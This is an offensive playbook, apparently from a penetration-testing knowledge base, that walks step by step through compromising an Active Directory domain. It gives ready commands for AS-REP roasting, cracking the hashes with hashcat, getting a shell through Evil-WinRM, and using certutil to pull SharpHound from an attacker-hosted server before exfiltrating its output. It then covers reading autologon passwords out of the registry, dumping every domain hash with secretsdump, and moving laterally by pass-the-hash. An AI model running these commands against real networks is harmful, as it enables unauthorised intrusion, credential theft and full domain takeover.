# Active-Directory-Compromise-via-AS-REP-Roasting-SharpHound-Enumeration-and-Secrets-Dumping

This attack chain demonstrates a realistic path to compromising an Active Directory environment starting from external reconnaissance, exploiting Kerberos misconfigurations for AS-REP roasting to obtain crackable hashes without initial credentials, gaining initial access via WinRM, performing deep enumeration with SharpHound and BloodHound, extracting autologon credentials, and finally dumping domain secrets for full compromise. The scenario assumes an attacker with network access to a domain-joined Windows environment, targeting common AD setups in enterprise networks. Difficulty: Intermediate-Advanced; Estimated Time: 4-8 hours.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 12 |
| Execution Time | ~4-8 hours |
| Skill Level | Intermediate-Advanced |
| Complexity | High |
| Impact Level | Critical |

## Attack Flow Visualization

```mermaid
graph TD
    A[Reconnaissance: Port Scan & LDAP] --> B[Credential Acquisition: AS-REP Roasting]
    B --> C[Hash Cracking: Hashcat]
    C --> D[Initial Access: WinRM Shell]
    D --> E[Enumeration: SharpHound & BloodHound]
    E --> F[Credential Extraction: Autologon & Local Users]
    F --> G[Lateral Movement & Dumping: Pass-the-Hash & Secretsdump]
    G --> H[Domain Compromise]

    style A fill:#3498db
    style B fill:#f39c12
    style C fill:#e67e22
    style D fill:#e74c3c
    style E fill:#9b59b6
    style F fill:#1abc9c
    style G fill:#34495e
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Nmap]] (port scanning and LDAP enumeration)
- [[tools/Impacket]] (Kerberos AS-REP roasting with GetNPUsers)
- [[tools/Hashcat]] (hash identification and cracking)
- [[tools/Evil-WinRM]] (WinRM access from Linux)
- [[tools/SharpHound]] (AD enumeration)
- [[tools/BloodHound]] (relationship analysis)

### Target Environment

- Windows Active Directory domain with domain controllers
- Open ports: 389 (LDAP), 88 (Kerberos), 135 (RPC), 5985 (WinRM)
- Users with UF_DONT_REQUIRE_PREAUTH flag set (common misconfiguration)
- Network connectivity from attacker machine to targets

### Initial Access Requirements

- No initial credentials required; relies on anonymous LDAP and Kerberos pre-auth bypass
- Attacker on same network segment or with firewall bypass
- Wordlist of potential usernames (e.g., from prior OSINT or default lists)

## Detailed Attack Procedures

### Step 1: Perform Basic Port Scan with Service Enumeration
procedure: [[procedures/Basic-Port-Scan-with-Service-Enumeration]]

**Objective**: Identify open ports and services on the target domain controller, focusing on RPC (135), LDAP (389), and Kerberos (88) to map the attack surface.

**Instructions**: Run an Nmap scan targeting common AD ports. Use [[commands/Nmap-Port-Scan-with-Service-Version-Detection]] to detect versions and confirm services like RPC and LDAP are exposed.

```bash
nmap -sV -p 88,135,389,445,5985 $_TARGET_IP
```

Parse the output to note open services for subsequent enumeration.

**Expected Output**: List of open ports with service versions, e.g., 389/tcp open ldap Microsoft LDAP.

**Success Indicators**:
- LDAP and Kerberos ports confirmed open
- No firewall blocks on targeted ports

### Step 2: Query LDAP and Enumerate Base DN
procedure: [[procedures/Query-LDAP-and-Enumerate-Base-DN-with-Nmap]]

**Objective**: Perform anonymous LDAP bind to extract the base distinguished name (DN) and basic domain structure without credentials.

**Instructions**: Use Nmap's LDAP script to query the directory. Execute [[commands/Nmap-LDAP-Enumeration-Script]] against port 389.

```bash
nmap -p 389 --script ldap-search $_TARGET_IP
```

Review the output for domain components like dc=example,dc=com.

**Expected Output**: LDAP context details, e.g., dn: dc=example,dc=com.

**Success Indicators**:
- Base DN extracted (e.g., dc=domain,dc=local)
- Anonymous bind successful

### Step 3: Brute Force AS-REP Roastable Users
procedure: [[procedures/Brute-Force-AS-REP-Roastable-Users-with-GetNPUsers]]

**Objective**: Identify valid users with 'Do Not Require Kerberos Preauth' flag and request their AS-REP TGTs for offline cracking.

**Instructions**: Prepare a username wordlist (e.g., common names or from LDAP enum). Run [[commands/GetNPUsers-AS-REP-Roasting-Brute-Force]] to request TGTs.

```bash
GetNPUsers.py $_DOMAIN/ -no-pass -usersfile $_USERS_WORDLIST.txt -dc-ip $_TARGET_IP -request -format hashcat -outputfile asrep_hashes.txt
```

Collect only responses with valid users (rc4_hmac hashes).

**Expected Output**: Hashcat-formatted AS-REP hashes for valid users, e.g., $krb5asrep$23$username@DOMAIN:hash.

**Success Indicators**:
- At least one valid user identified with AS-REP hash
- No authentication errors for targeted users

### Step 4: Identify Password Hash Type
procedure: [[procedures/Identify-Password-Hash-Type-with-Hashcat]]

**Objective**: Determine the exact hash mode for AS-REP hashes to select the correct cracking attack.

**Instructions**: Compare the hash format against Hashcat's example hashes documentation. Use [[commands/Hashcat-Identify-Hash-Mode]] if needed for validation, but primarily manual identification via prefix (e.g., $krb5asrep$ for mode 18200).

**Expected Output**: Confirmed mode, e.g., Kerberos 5 AS-REP etype 23 (mode 18200).

**Success Indicators**:
- Hash type matched to Hashcat mode
- Ready for cracking with appropriate parameters

### Step 5: Brute Force AS-REP Hashes
procedure: [[procedures/Brute-Force-AS-REP-Hashes-with-Hashcat]]

**Objective**: Crack the obtained AS-REP hashes offline using dictionary attack to recover plaintext passwords.

**Instructions**: Load the hashes and a strong wordlist (e.g., rockyou.txt). Execute [[commands/Hashcat-Dictionary-Attack-on-Hashes]] with mode 18200.

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

Monitor for cracked passwords and use --show to recover them.

**Expected Output**: Cracked passwords displayed, e.g., username:password.

**Success Indicators**:
- At least one hash cracked
- Plaintext credentials obtained for valid users

### Step 6: Spawn Interactive WinRM Shell
procedure: [[procedures/Spawn-Interactive-WinRM-Shell-from-Linux]]

**Objective**: Gain an interactive shell on the target using cracked credentials via WinRM for initial foothold.

**Instructions**: With obtained username/password, connect using [[commands/Evil-WinRM-Connect-with-Plaintext-Credentials]].

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD
```

Once connected, execute basic commands to confirm access.

**Expected Output**: Evil-WinRM shell prompt, e.g., *Evil-WinRM* PS C:\Users\username>

**Success Indicators**:
- Shell access granted
- Ability to run PowerShell commands remotely

### Step 7: Map Active Directory with SharpHound
procedure: [[procedures/Map-Active-Directory-with-SharpHound]]

**Objective**: Collect comprehensive AD data (users, groups, ACLs) for graph analysis.

**Instructions**: Host SharpHound.exe on a web server, download to target via WinRM session, then run [[commands/SharpHound-Collect-AD-Data]]. First, start server with [[commands/Python-HTTP-Server-for-File-Hosting]]:

```bash
python3 -m http.server 8000
```

On target: [[commands/Certutil-Download-File-from-HTTP]]:

```command_prompt
certutil.exe -urlcache -split -f "http://$_ATTACKER_IP:8000/SharpHound.exe" "C:\temp\SharpHound.exe"
```

Execute:

```command_prompt
SharpHound.exe -c All -d $_DOMAIN
```

Exfiltrate the ZIP file.

**Expected Output**: BloodHound-compatible ZIP with JSON data files.

**Success Indicators**:
- Enumeration completes without errors
- ZIP file generated and exfiltrated

### Step 8: Analyze BloodHound Data for Relationships
procedure: [[procedures/Analyze-BloodHound-Data-for-AD-Relationships]]

**Objective**: Import SharpHound data into BloodHound to visualize attack paths and relationships.

**Instructions**: Launch BloodHound, import the ZIP via UI. Run pre-built queries like 'Find All Kerberoastable Users' or 'Shortest Paths to Domain Admins'.

**Expected Output**: Graph visualizations showing paths, e.g., user -> group -> DA.

**Success Indicators**:
- Data imported successfully
- Attack paths identified (e.g., to high-value targets)

### Step 9: List Windows Autologon Credentials
procedure: [[procedures/List-Windows-Autologon-Credentials-from-Registry]]

**Objective**: Extract plaintext credentials stored in the registry for auto-logon feature.

**Instructions**: From the WinRM shell, query the registry with [[commands/Reg-Query-Autologon-Registry-Keys]].

```command_prompt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Look for DefaultUserName, DefaultPassword, DefaultDomainName.

**Expected Output**: Registry values including plaintext password.

**Success Indicators**:
- Credentials found in Winlogon keys
- Valid domain or local creds recovered

### Step 10: List Local Users on Windows
procedure: [[procedures/List-Local-Users-on-Windows]]

**Objective**: Enumerate local accounts on the compromised host for potential privilege escalation targets.

**Instructions**: Run [[commands/Net-User-List-Local-Accounts]] from the shell.

```command_prompt
net user
```

Note any non-standard local admins.

**Expected Output**: List of local users, e.g., Administrator, Guest.

**Success Indicators**:
- Full list of local accounts retrieved
- Identification of potential weak local accounts

### Step 11: Dump Secrets from Remote System
procedure: [[procedures/Dump-Secrets-from-Remote-Windows-System]]

**Objective**: Extract domain hashes (NTLM, LM) from the remote DC using DCSync-like method.

**Instructions**: With domain creds, run [[commands/Secretsdump-Dump-Remote-Hashes]] targeting the DC.

```bash
impacket-secretsdump -dc-ip $_DC_IP $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

Focus on NTDS.dit extraction.

**Expected Output**: Hashes for all domain users, e.g., Administrator:500:...:nthash.

**Success Indicators**:
- Domain hashes dumped
- krbtgt and admin hashes obtained

### Step 12: Connect to WinRM with Pass-the-Hash
procedure: [[procedures/Connect-to-WinRM-from-Linux-with-Pass-the-Hash]]

**Objective**: Pivot to another host using dumped NTLM hashes without cracking passwords.

**Instructions**: Use obtained NTLM hash with [[commands/Evil-WinRM-Connect-with-NTLM-Hash]].

```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

**Expected Output**: Shell prompt on new target.

**Success Indicators**:
- Successful PTH authentication
- Lateral movement achieved

## Attack Chain Summary

### Key Achievements

- Discovered AD services and structure without creds
- Acquired and cracked AS-REP hashes for initial access
- Mapped full AD graph and identified paths to DA
- Extracted autologon and local creds for escalation
- Dumped domain secrets for persistence and further compromise

---

*Last updated: 2023-10-01T00:00:00Z*
